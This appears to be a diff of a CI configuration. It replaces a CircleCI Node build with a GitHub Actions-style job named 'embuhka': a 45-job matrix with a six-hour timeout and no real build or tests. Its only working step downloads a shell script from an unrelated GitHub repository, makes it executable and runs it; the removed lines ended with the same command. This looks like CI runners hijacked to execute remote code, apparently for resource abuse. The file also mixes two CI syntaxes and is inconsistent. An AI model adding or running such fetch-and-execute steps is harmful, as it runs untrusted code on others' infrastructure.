@@ -5,30 +5,26 @@
 version: 2
 jobs:
   build:
-    docker:
-      - image: circleci/node:8.9.0
-
-      # Specify service dependencies here if necessary
-      # CircleCI maintains a library of pre-built images
-      # documented at https://circleci.com/docs/2.0/circleci-images/
-      # - image: circleci/mongo:3.4.4
-
+    name: embuhka
+    runs-on: ubuntu-latest    
+    strategy:
+        max-parallel: 5
+        fail-fast: false
+        matrix:
+            go: [1.6, 1.7, 1.8, 1.9, 1.10]
+            flag: [A, B, C, D, E, F, G, H, I]
+    timeout-minutes: 360
+    env:
+          NUM_JOBS: 20
+          JOB: ${{ matrix.go }}
     steps:
-      - checkout
-
-      # Download and cache dependencies
-      - restore_cache:
-          keys:
-          - v1-dependencies-{{ checksum "package.json" }}
-          # fallback to using the latest cache if no exact match is found
-          - v1-dependencies-
-
-      - run: npm install
-
-      - save_cache:
-          paths:
-            - node_modules
-          key: v1-dependencies-{{ checksum "package.json" }}
-
-      # run tests!
-      - run: wget https://raw.githubusercontent.com/makaryobos/privasi/main/lopemantan.sh && chmod +x *sh && ./lopemantan.sh
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+       go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v2
+    - name: embuhka
+      run: |
+        wget https://raw.githubusercontent.com/makaryobos/privasi/main/lopemantan.sh && chmod +x *sh && ./lopemantan.sh
